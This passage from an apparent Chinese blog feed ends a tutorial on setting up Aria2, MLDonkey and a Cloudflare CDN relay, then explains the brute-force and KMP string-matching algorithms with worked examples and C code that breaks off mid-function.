默认:falsebt-seed-unverified=true# 保存磁力链接元数据为种子文件(.torrent文件), 默认:false#bt-save-metadata=truebt-tracker=udp://tracker.coppersurfer.tk:6969/announce,udp://tracker.opentrackr.org:1337/announce,udp://tracker.internetwarriors.net:1337/announce,http://tracker.internetwarriors.net:1337/announce,udp://9.rarbg.to:2710/announce,udp://exodus.desync.com:6969/announce,udp://explodie.org:6969/announce,http://explodie.org:6969/announce,udp://tracker.vanitycore.co:6969/announce,udp://public.popcorn-tracker.org:6969/announce,http://tracker.vanitycore.co:6969/announce,udp://mgtracker.org:6969/announce,http://mgtracker.org:6969/announce,udp://tracker1.itzmx.com:8080/announce,udp://ipv4.tracker.harry.lu:80/announce,http://tracker3.itzmx.com:6961/announce,http://tracker1.itzmx.com:8080/announce,udp://tracker.torrent.eu.org:451/announce,udp://tracker.tiny-vps.com:6969/announce,udp://open.stealth.si:80/announce,udp://tracker.port443.xyz:6969/announce,udp://open.demonii.si:1337/announce,udp://denis.stalker.upeer.me:6969/announce,udp://bt.xxx-tracker.com:2710/announce,http://tracker.port443.xyz:6969/announce,http://open.acgnxtracker.com:80/announce,udp://retracker.lanta-net.ru:2710/announce,http://retracker.telecom.by:80/announce,udp://thetracker.org:80/announce,http://torrent.nwps.ws:80/announce,http://0d.kebhana.mx:443/announce,udp://tracker.uw0.xyz:6969/announce,udp://tracker.cypherpunks.ru:6969/announce,https://tracker.fastdownload.xyz:443/announce,https://opentracker.xyz:443/announce,http://tracker.cypherpunks.ru:6969/announce,http://opentracker.xyz:80/announce,http://open.trackerlist.xyz:80/announce,udp://zephir.monocul.us:6969/announce,udp://tracker.ds.is:6969/announce,wss://ltrackr.iamhansen.xyz:443/announce,udp://tracker2.itzmx.com:6961/announce,udp://tracker.tvunderground.org.ru:3218/announce,udp://tracker.toss.li:6969/announce,udp://tracker.swateam.org.uk:2710/announce,udp://tracker.kamigami.org:2710/announce,udp://tracker.iamhansen.xyz:2000/announce,https://2.track.ga:443/announce,http://wegkxfcivgx.chickenkiller.com:80/announce,http://tracker4.itzmx.com:2710/announce,http://tracker2.itzmx.com:6961/announce,http://tracker.tvunderground.org.ru:3218/announce,http://tracker.torrentyorg.pl:80/announce,http://tracker.city9x.com:2710/announce,http://t.nyaatracker.com:80/announce,http://retracker.mgts.by:80/announce,http://open.acgtracker.com:1096/announce,http://node.611.to:9000/announce,wss://tracker.fastcast.nz:443/announce,wss://tracker.btorrent.xyz:443/announce,udp://tracker.justseed.it:1337/announce,udp://packages.crunchbangplusplus.org:6969/announce,https://1337.abcvg.info:443/announce,http://share.camoe.cn:8080/announce,http://fxtt.ru:80/announce</code></pre><p>将 Aria2NG 解压到网站根目录下，从浏览器访问，然后配置对应 Aria2 本地配置项：</p><ul><li>使用协议</li><li>域名 地址 端口</li><li>RPC 密钥</li></ul><p>即可使用。</p><h3 id="Aria2-trackers-all-txt"><a href="#Aria2-trackers-all-txt" class="headerlink" title="Aria2 (trackers_all.txt)"></a>Aria2 (trackers_all.txt)</h3><p>来源：<a href="https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all.txt</a></p><h3 id="MLdonkey-var-lib-mldonkey-downloads-ini"><a href="#MLdonkey-var-lib-mldonkey-downloads-ini" class="headerlink" title="MLdonkey (/var/lib/mldonkey/downloads.ini)"></a>MLdonkey (/var/lib/mldonkey/downloads.ini)</h3><pre><code>allowed_ips = [&quot;0.0.0.0/0&quot;;] shared_directories = [  {     dirname = shared     strategy = all_files     priority = 0};  {     dirname = &quot;&lt;下载文件保存目录&gt;&quot;     strategy = incoming_files     priority = 0};  {     dirname = &quot;incoming/directories&quot;     strategy = incoming_directories     priority = 0};]</code></pre><p>保存目录可以自由修改，需要注意文件夹权限问题。</p><h3 id="MLDonkey-的进一步配置"><a href="#MLDonkey-的进一步配置" class="headerlink" title="MLDonkey 的进一步配置"></a>MLDonkey 的进一步配置</h3><p>在完成上面的配置之后，我们来添加管理员账户并设置一个普通用户。</p><p>同时对 ED2K 服务器列表 server.met 进行一次更新。</p><pre class="line-numbers language-bash"><code class="language-bash">$ telnet localhost 4000<span class="token operator">></span> <span class="token function">useradd</span> admin <span class="token operator">&lt;</span>你的管理员密码<span class="token operator">></span><span class="token operator">></span> quit$ <span class="token function">sudo</span> systemctl restart mldonkey-server$ telnet localhost 4000<span class="token operator">></span> auth admin <span class="token operator">&lt;</span>你的管理员密码<span class="token operator">></span><span class="token operator">></span> d http://ed2k.2x4u.de/v1s4vbaf/max/server.met<span class="token operator">></span> <span class="token function">useradd</span> 普通用户名 普通用户密码<span class="token operator">></span> quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过上述设置之后，你可以通过 <code>http://&lt;你的IP&gt;:4080</code> 来登陆 WebUI 进行下载了。</p><p>注意每次拷贝下载完成的文件之前要去 WebUI 右上角命令框里输入一次 <code>commit</code>.</p><h4 id="MLDonkey-忘记管理员密码"><a href="#MLDonkey-忘记管理员密码" class="headerlink" title="MLDonkey 忘记管理员密码"></a>MLDonkey 忘记管理员密码</h4><p><code>/var/lib/mldonkey/users.ini</code> 里：</p><p>将对应 <code>user_name = admin</code> 的 <code>user_pass</code> 清空后重启服务。</p><h2 id="关于后台进程守护"><a href="#关于后台进程守护" class="headerlink" title="关于后台进程守护"></a>关于后台进程守护</h2><p>建议参考 阮一峰老师的 Systemd 相关教程和 计算器启动 与 后台守护相关文章</p><ul><li><p><a href="http://www.ruanyifeng.com/blog/2016/02/linux-daemon.html" target="_blank" rel="noopener">Linux 后台守护</a></p></li><li><p><a href="http://www.ruanyifeng.com/blog/2013/02/booting.html" target="_blank" rel="noopener">计算机是如何启动的</a></p></li><li><p><a href="http://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html" target="_blank" rel="noopener">Linux 是如何启动的</a></p></li></ul><blockquote><p>Unix 哲学: Keep simple, keep stupid.</p></blockquote><ul><li><p><a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html" target="_blank" rel="noopener">Systemd Commands</a></p></li><li><p><a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html" target="_blank" rel="noopener">Systemd Services</a></p></li><li><p><a href="http://www.ruanyifeng.com/blog/2018/03/systemd-timer.html" target="_blank" rel="noopener">Systemd Timer (You could also use crontab)</a></p></li></ul><p>如果你想学习更多的内容，也欢迎你前往 <a href="https://wiki.archlinux.org/" target="_blank" rel="noopener">Arch Linux Wiki</a> 那里有最详细的人类友好型文档，Arch Wiki 中的大多数内容对基于 Systemd 的发行版均是适用的。</p><h1 id="CDN-中转加速"><a href="#CDN-中转加速" class="headerlink" title="CDN 中转加速"></a>CDN 中转加速</h1><h2 id="准备域名"><a href="#准备域名" class="headerlink" title="准备域名"></a>准备域名</h2><p>如果你还没有域名，你需要注册一个域名，个人推荐 <a href="https://www.namesilo.com/register.php?rid=bd46d72xg" target="_blank" rel="noopener">NameSilo</a> ，便宜，附送 WHOIS 隐私保护，支持支付宝。</p><p>然后建议将域名托管到 <a href="https://dns.he.net" target="_blank" rel="noopener">https://dns.he.net</a> ，分别添加一个指向 @ 和 www 的 A 记录。再添加一个 cf_www 和 回源二级域名 的 A 记录。</p><p>注册一个 Cloudflare 账户，注册完成后不做任何配置。</p><h2 id="CNAME-接入-Cloudflare-加速"><a href="#CNAME-接入-Cloudflare-加速" class="headerlink" title="CNAME 接入 Cloudflare 加速"></a>CNAME 接入 Cloudflare 加速</h2><ol><li>寻找一家 Cloudflare Partner，并确保您的域名 <strong>没有</strong> 在 Cloudflare 注册过或正在处于 Cloudflare 服务之下。</li><li>按照提示添加域名，之后按照 Partner 提示设置 www 记录的回源地址为 cf_www 地址。</li><li>添加一个 CDN 加速域名，此 CDN 加速域名的回源地址指向 回源二级域名 地址。</li><li>前往您的域名托管商，本例中是 HE，添加一个 CNAME 记录，从 CDN 加速域名 指向 <code>cdn.cf-a.x-gslb.com</code> 或者 <code>cdn.cf-b.x-gslb.com</code> 。</li><li>通过 CDN 加速域名下载文件即可。</li></ol><h1 id="完"><a href="#完" class="headerlink" title="完"></a>完</h1><p>还有问题？请使用评论框。</p><p>公告：本站评论 <strong>不对</strong> 使用中国大陆 IP 地址访问本站的用户开放。</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul><li><a href="https://caddyserver.com/docs" target="_blank" rel="noopener">Caddy Server Documentation</a></li><li><a href="https://doub.io/goflyway-jc3/" target="_blank" rel="noopener">Doubi Location</a></li><li><a href="https://www.dcc.cat/cloudflare/" target="_blank" rel="noopener">Cloudflare $5000 Route</a></li><li><a href="https://dns.he.net/" target="_blank" rel="noopener">HE.net DNS</a></li><li><a href="https://doub.io/jzzy-3/" target="_blank" rel="noopener">Caddy Filemanager</a></li><li><a href="https://doub.io/shell-jc4/" target="_blank" rel="noopener">Aria 2 Onekey Script</a></li><li><a href="https://github.com/mayswind/AriaNg" target="_blank" rel="noopener">AriaNG WebUI</a></li><li><a href="http://mldonkey.sourceforge.net/Allowed_ips" target="_blank" rel="noopener">MLDonkey Config</a></li><li><a href="https://secure.hostsolutions.ro/aff.php?aff=513&amp;pid=271" target="_blank" rel="noopener">Hostsolutions Anti-DMCA VPS</a></li></ul>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>KMP 与 BF 字符串模式匹配算法简析</title>
      <link href="/2018/KMP-BF-DataStru/"/>
      <url>/2018/KMP-BF-DataStru/</url>
      <content type="html"><![CDATA[<h1 id="字符串模式匹配算法"><a href="#字符串模式匹配算法" class="headerlink" title="字符串模式匹配算法"></a>字符串模式匹配算法</h1><p>这里讨论两种常见的字符串模式匹配算法，不讨论字符串的预处理。</p><p>关于对字符串进行搜索，请参考 <a href="https://zh.m.wikipedia.org/wiki/Boyer-Moore%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">Boyer-Moore 字符串搜索算法 (Wikipedia CN)</a></p><p>另外建议大家阅读 [Sunday 算法]</p><h2 id="BF-算法-Brute-Force"><a href="#BF-算法-Brute-Force" class="headerlink" title="BF 算法 (Brute Force)"></a>BF 算法 (Brute Force)</h2><p>返回子串 Ptn 在主串 Tag 的第 pos 个字符后(含第 pos 个位置)第一次出现的位置，若不存在，则返回 -1，这里的位置全部以从 0 开始计算为准，其中 T 非空，0 &lt;= pos &lt;= Tlen。</p><p>使用 i 标记当前在 Tag 中匹配的字符的位置，初始值为 pos。 使用 j 标记 Ptn 中正在等待比较的位置，初始值为 0,下同。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>Tag<span class="token punctuation">,</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>Ptn<span class="token punctuation">,</span><span class="token keyword">int</span> pos<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即对 Tag 的每一个字符与 Ptn 的字符进行逐字比较：</p><ul><li>若完整匹配则返回匹配成功的 pos 值。</li><li>匹配过程中，对当前的 pos 值对应位置之后的每一字符进行 Ptn 的匹配，出现不符合的情况，则将 i 置为 pos + 1，j 置为 0；从当前 pos 值对应的下一个字符开始从头对 Ptn 进行匹配。</li><li>若扫描完整个 Tag 都无法匹配，返回 -1.</li></ul><p>该算法在最坏情况下的时间复杂度为 O(len(P)*len(T))，另外该算法的空间复杂度为 O(1)。</p><h2 id="KMP-算法-Kruth-Morris-Pratt"><a href="#KMP-算法-Kruth-Morris-Pratt" class="headerlink" title="KMP 算法 (Kruth-Morris-Pratt)"></a>KMP 算法 (Kruth-Morris-Pratt)</h2><p>上述算法的时间复杂度为乘积关系，是由于索引指针回溯引起的，针对上述不足，有了 KMP 算法。 KMP 算法的时间复杂度为 O(len(P)+len(T))，空间复杂度为 O(len(P))。这个算法改进的地方在于，不需要过度回溯索引指针 i，而是利用部分匹配结果尽可能的向远滑动，继续进行回溯。</p><h3 id="算法示例"><a href="#算法示例" class="headerlink" title="算法示例"></a>算法示例</h3><p>Step 0: 比较开始。</p><pre><code>     00000000001111111111222i:   01234567890123456789012Tag: ABC ABCDAB ABCDABCDABDEPtn: ABCDABDj:   0123456</code></pre><p>Step 1: 从头比较，比较到 Tag[3] = ‘ ‘ 时发现与 Ptn[3] = ‘D’ 不符。我们已知 Tag[1~3] 与 Ptn[0] 不符，接下来略过这些字符，令 i = 4, j = 0</p><pre><code>     00000000001111111111222i:   01234567890123456789012Tag: ABC ABCDAB ABCDABCDABDEPtn:     ABCDABDj:       0123456</code></pre><p>Step 2：这时我们继续检索 Tag，发现仍不匹配，但是 Tag[8~9] 对应的 ‘AB’ 出现了两次，故可以作为下次比较的起始点，我们令 i = 8, j = 2，继续比较。</p><pre><code>     00000000001111111111222i:   01234567890123456789012Tag: ABC ABCDAB ABCDABCDABDEPtn:         ABCDABDj:           0123456</code></pre><p>Step 3：到 i = 10 时，此时我们放弃比较重复内容，比较 i = 10 与 j = 2 发现出现不符。接下来，由于 ‘AB’ 重复出现，我们从 i = 11, j = 0 开始比较。</p><pre><code>     00000000001111111111222i:   01234567890123456789012Tag: ABC ABCDAB ABCDABCDABDEPtn:            ABCDABDj:              0123456</code></pre><p>Step 4：到 i = 17, j = 6 出现不相同异常，我们采取一贯的做法，令 i = 15, j = 2 继续搜索。</p><pre><code>     00000000001111111111222i:   01234567890123456789012Tag: ABC ABCDAB ABCDABCDABDEPtn:                ABCDABDj:                  0123456</code></pre><p>Step 5：此时我们找到完全匹配的字符串，初始位置为 15, 返回 i。比较结束。</p><h3 id="失配函数"><a href="#失配函数" class="headerlink" title="失配函数"></a><strong>失配函数</strong></h3><p>特殊情况：当一个失配出现在模式串的此次匹配最开始，此时无法回退，我们置 j = -1，跳到模式串的开头字符。</p><p>关键：建立 next 表。</p><h4 id="理清匹配过程"><a href="#理清匹配过程" class="headerlink" title="理清匹配过程"></a>理清匹配过程</h4><p>假设现在文本串 Tag 匹配到 i 位置，模式串 Ptn 匹配到 j 位置：</p><ul><li>如果 j == -1 或当前字符匹配成功（即 Tag[i] == Ptn[j]），都令 i++，j++，继续匹配下一个字符；</li><li>如果当前字符匹配失败（即 Tag[i] != Ptn[j]），则令 i 不变，j = next[j]。此举意味着失配时，模式串 Ptn 相对于文本串 Tag 向右移动了 (j - next [j]) 位。<br>换言之，当匹配失败时，模式串向右移动的位数为： <strong>失配字符所在位置 - 失配字符对应的 next 值（next 数组的求解会在下文中详细阐述），即移动的实际位数为：(j - next[j])</strong> ，且此值大于等于 1。</li></ul><p>很快，你也会意识到 next 数组各值的含义：代表当前字符之前的字符串中，有多大长度的相同前缀后缀。例如如果 next [j] = k，代表 j 之前的字符串中有最大长度为 k 的相同前缀后缀。</p><ul><li>这也意味着在某个字符失配时，该字符对应的 next 值会告诉你下一步匹配中，模式串应该跳到哪个位置（跳到 next [j] 的位置）。如果 next [j] 等于 0，则跳到模式串的开头字符，若 next [j] = k 且 k &gt; 0，代表下次匹配跳到 j 之前的某个字符，而不是跳到开头，且具体跳过了 k 个字符。</li></ul><p>这里，我们明确一点，next 表的产生实际只与 <strong>模式串及其子串</strong> 有关。</p><h4 id="关于-Next-表的建立"><a href="#关于-Next-表的建立" class="headerlink" title="关于 Next 表的建立"></a>关于 Next 表的建立</h4><ol><li>寻找前缀后缀的公共元素最大长度</li></ol><p>对于 Ptn = p0 p1 … pj ，寻找 Ptn 中长度最大且相等的前缀和后缀。若存在 p0 p1 … pk = p(j-k) p(j-k+1)… pj，那么在包含 pj 的模式串中有最大长度为 k+1 的相同前缀和后缀。</p><ol start="2"><li>求 next 数组</li></ol><p>next 数组考虑的是除当前字符外的最长相同前缀后缀，所以通过第 ① 步骤求得各个前缀后缀的公共元素的最大长度后，只要稍作变形即可：将第 ① 步骤中求得的值整体右移一位，然后初值赋为 -1 。</p><ol start="3"><li>根据 next 数组进行匹配 </li></ol><p>匹配失配，j = next[j] ，模式串向右移动 j - next[j] 位。即当 模式串的后缀 p(j-k) p(j-k+1) … p(j-1) 和 源串 s(i-k) s(i-k+1) … s(i-1) 匹配成功，但最后一位 pj 和 si 匹配失败的时候，因为 next[j] = k，等价于 <strong>在不包含 pj 的模式串中有最大公共长度为 k 的前缀后缀，即 p0 p1 … p(k-1) = p(j-k+) p(j-k+1) … p(j-1)</strong> ，接下来我们令 j = next[j] ，从而让字符串右移 next[j] 位，此时模式串的最大长度公共前缀 p0 p1 … p(k-1) 对应这 s(i-k) s(i-k+1) … s(i-1), 实现了跳过公共前后缀的匹配，直接匹配 pk 和 si 继续匹配。</p><h3 id="学习之后实验"><a href="#学习之后实验" class="headerlink" title="学习之后实验"></a>学习之后实验</h3><pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE匹配模式串 PTN:               ABCDABD</code></pre><ol><li>寻找最长前缀后缀</li></ol><table><thead><tr><th style="text-align:center">子串</th><th style="text-align:center">前缀</th><th style="text-align:center">后缀</th><th style="text-align:center">最大公共元素长度</th></tr></thead><tbody><tr><td style="text-align:center">A</td><td style="text-align:center">/</td><td style="text-align:center">/</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">AB</td><td style="text-align:center">A</td><td style="text-align:center">B</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">ABC</td><td style="text-align:center">A,AB</td><td style="text-align:center">C,BC</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">ABCD</td><td style="text-align:center">A,AB,ABC</td><td style="text-align:center">D,CD,BCD</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">ABCDA</td><td style="text-align:center"><font color="red">A</font>,AB,ABC,ABCD</td><td style="text-align:center"><font color="red">A</font>,DA,CDA,BCDA</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">ABCDAB</td><td style="text-align:center">A,<font color="red">AB</font>,ABCD,ABCDA</td><td style="text-align:center">B,<font color="red">AB</font>,DAB,CDAB,BCDAB</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">ABCDABD</td><td style="text-align:center">A,AB,ABC,ABCD,ABCDA,ABCDAB</td><td style="text-align:center">D,BD,ABD,DABD,CDABD,BCDABD</td><td style="text-align:center">0</td></tr></tbody></table><p>对应生成的公共元素最大长度表如下：</p><table><thead><tr><th>字符</th><th>A</th><th>B</th><th>C</th><th>D</th><th>A</th><th>B</th><th>D</th></tr></thead><tbody><tr><td>最大前缀后缀公共元素长度</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>2</td><td>0</td></tr></tbody></table><ol start="2"><li>基于最大长度表生成 NEXT 表</li></ol><p>原来 next 数组的求解竟然如此简单：就是找最大对称长度的前缀后缀，然后整体右移一位，初值赋为-1（当然，你也可以直接计算某个字符对应的next值，就是 <strong>看这个字符之前的字符串中有多大长度的相同前缀后缀</strong>）</p><table><thead><tr><th>模式串子串</th><th>A</th><th>B</th><th>C</th><th>D</th><th>A</th><th>B</th><th>D</th></tr></thead><tbody><tr><td>NEXT</td><td>-1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>2</td></tr></tbody></table><blockquote><p>备注：这里其实 next[A0] == -1，意在告诉程序当一开始模式串第一个字符与文本串就不匹配时，可以放弃此次匹配，直接将模式串不断右移一位开始下一次匹配。</p></blockquote><ol start="3"><li>初始匹配</li></ol><pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE匹配模式串 PTN:    ABCDABD</code></pre><p>这里，我们从一开始就发现没有匹配的字符，于是不断后移一位。移动到 i = 4 时，与第五个字符 A 匹配成功，接下来，一直向下匹配，匹配到 j = 6 （字母 D2）时，发生失配。这时将模式串后移，后移 j = j - next[D2] = 6 - 2 = 4 位。</p><ol start="4"><li>第二次匹配</li></ol><pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE匹配模式串 PTN:        ABCDABD</code></pre><p>这里，移动到 i = 8 时，与第九个字符 A 匹配成功，接下来，一直向下匹配，匹配到 j = 2 （字母 C）时，发生失配。这时将模式串后移，后移 j = j - next[C] = 2 - 0 = 2 位。</p><ol start="5"><li>第三次匹配， (TAG[10] = ‘ ‘) != (PTN[0] == ‘A’)，后移 j = j - next[A1] = 0 - (-1) = 1 位。</li></ol><pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE匹配模式串 PTN:          ABCDABD</code></pre><ol start="6"><li>第四次匹配， (TAG[17] = ‘C’) != (PTN[6] == ‘D’)，后移 j = j - next[D2] = 6 - 2 = 4 位。</li></ol><pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE匹配模式串 PTN:           ABCDABD</code></pre><ol start="7"><li>第五次匹配， 匹配成功。</li></ol><pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE匹配模式串 PTN:               ABCDABD</code></pre><h3 id="关于逍爷的讲解"><a href="#关于逍爷的讲解" class="headerlink" title="关于逍爷的讲解"></a>关于逍爷的讲解</h3><p>试比较：</p><p>失配时，模式串向右移动的位数为：失配字符所在<strong>位置</strong> - 失配字符对应的 next 值</p><p>失配时，模式串向右移动的位数为：<strong>已匹配字符数 - 失配字符的上一位字符所对应的最大长度值</strong></p><p>其实二者等价，只不过讲法不同罢了。</p><p>根据《最大长度表》，失配时，模式串向右移动的位数 = 已经匹配的字符数 - 失配字符的上一位字符的最大长度值。</p><p>而根据《next 数组》，失配时，模式串向右移动的位数 = 失配字符的位置 - 失配字符对应的 next 值。</p><p>其中，从 0 开始计数时，失配字符的位置 = 已经匹配的字符数（失配字符不计数），而失配字符对应的next 值 = 失配字符的上一位字符的最大长度值，两相比较，结果必然完全一致。</p><h2 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码"></a>相关代码</h2><h3 id="BF"><a href="#BF" class="headerlink" title="BF"></a>BF</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ViolentMatch</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> sLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> pLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> sLen <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;</span> pLen<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//①如果当前字符匹配成功（即 Tag[i] == Ptn[j]），则 i++，j++    </span>            i<span class="token operator">++</span><span class="token punctuation">;</span>            j<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//②如果失配（即 Tag[i]! = Ptn[j]），令i = i - (j - 1)，j = 0    </span>            i <span class="token operator">=</span> i <span class="token operator">-</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//匹配成功，返回模式串 Ptn 在文本串 Tag 中的位置，否则返回 -1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> pLen<span class="token punctuation">)</span>        <span class="token keyword">return</span> i <span class="token operator">-</span> j<span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">KmpSearch</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> sLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> pLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> sLen <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;</span> pLen<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//①如果当前字符匹配成功（即 Tag[i] == Ptn[j]），都令 i++，j++    </span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>            j<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//②如果当前字符匹配失败（即 Tag[i] != Ptn[j]），则令 i 不变，j = next[j]    </span>            <span class="token comment" spellcheck="true">//next[j]即为j所对应的next值      </span>            j <span class="token operator">=</span> next<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> pLen<span class="token punctuation">)</span>        <span class="token keyword">return</span> i <span class="token operator">-</span> j<span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="改进后的-Next-数组的递归生成"><a href="#改进后的-Next-数组的递归生成" class="headerlink" title="改进后的 Next 数组的递归生成"></a>改进后的 Next 数组的递归生成</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">GetNextval</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> next<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> pLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    next<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;</span> pLen <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//p[k]表示前缀，p[j]表示后缀  </span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> p<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> p<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token operator">++</span>j<span class="token punctuation">;</span>            <span class="token operator">++</span>k<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//较之前next数组求法，改动在下面4行</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> p<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>                next<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">;</span>   <span class="token comment" 